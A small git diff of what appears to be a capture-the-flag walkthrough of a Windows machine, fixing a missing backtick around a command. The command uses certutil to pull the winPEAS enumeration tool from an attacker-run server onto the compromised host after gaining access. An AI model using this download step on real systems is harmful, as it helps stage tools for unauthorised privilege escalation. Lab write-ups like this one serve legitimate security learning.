@@ -78,7 +78,7 @@ Second run:
 ![](https://github.com/user-attachments/assets/f1ca4ff2-63b1-4b8f-ac92-5cb07ad0a277)
 
 Now that we're in, we will upload `winpeas` to do some enumeration:
-We will again open a server hosting the file and use `certutil` to download it: `certutil -f -split -urlcache http://xx.xx.xx.xx:<PORT>/winPEASany.exe winPEAS.exe
+We will again open a server hosting the file and use `certutil` to download it: `certutil -f -split -urlcache http://xx.xx.xx.xx:<PORT>/winPEASany.exe winPEAS.exe`
 ![](https://github.com/user-attachments/assets/7c432bc9-ffba-4a47-9314-d996eb3d1f1d)
 
 Now it's time to fire it up:
